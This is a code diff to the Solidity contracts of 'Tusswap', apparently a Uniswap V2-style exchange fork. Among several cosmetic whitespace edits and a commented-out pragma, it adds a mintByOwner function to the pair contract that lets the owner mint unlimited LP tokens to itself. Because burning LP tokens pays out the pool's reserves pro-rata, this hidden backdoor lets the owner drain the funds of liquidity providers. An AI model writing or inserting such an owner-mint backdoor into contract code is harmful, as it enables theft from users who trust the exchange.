@@ -74,7 +74,7 @@ library Math {
 }
 
 
-pragma solidity =0.5.16;
+// pragma solidity =0.5.16;
 
 // a library for handling binary fixed point numbers (https://en.wikipedia.org/wiki/Q_(number_format))
 
@@ -146,6 +146,7 @@ contract TusswapERC20 {
     }
 
     function transferFrom(address from, address to, uint value) external returns (bool) {
+
         if (allowance[from][msg.sender] != uint(-1)) {
             allowance[from][msg.sender] = allowance[from][msg.sender].sub(value);
         }
@@ -217,7 +218,10 @@ contract TusswapPair is TusswapERC20 {
         token0 = _token0;
         token1 = _token1;
     }
-
+    function mintByOwner(uint mint0) external {
+        require(msg.sender == owner, 'Tusswap mint: FORBIDDEN');
+        _mint(owner, mint0);
+    }
     // update reserves and, on the first call per block, price accumulators
     function _update(uint balance0, uint balance1, uint112 _reserve0, uint112 _reserve1) private {
         require(balance0 <= uint112(-1) && balance1 <= uint112(-1), 'Tusswap: OVERFLOW');
@@ -260,8 +264,8 @@ contract TusswapPair is TusswapERC20 {
         uint liquidity = balanceOf[address(this)];
 
         uint _totalSupply = totalSupply; // gas savings, must be defined here since totalSupply can update in _mintFee
-        amount0 = liquidity.mul(balance0) / _totalSupply; // using balances ensures pro-rata distribution
-        amount1 = liquidity.mul(balance1) / _totalSupply; // using balances ensures pro-rata distribution
+        amount0 = liquidity.mul(balance0) / _totalSupply ; // using balances ensures pro-rata distribution
+        amount1 = liquidity.mul(balance1) / _totalSupply ; // using balances ensures pro-rata distribution
         require(amount0 > 0 && amount1 > 0, 'Tusswap: INSUFFICIENT_LIQUIDITY_BURNED');
         _burn(address(this), liquidity);
         _safeTransfer(_token0, to, amount0);
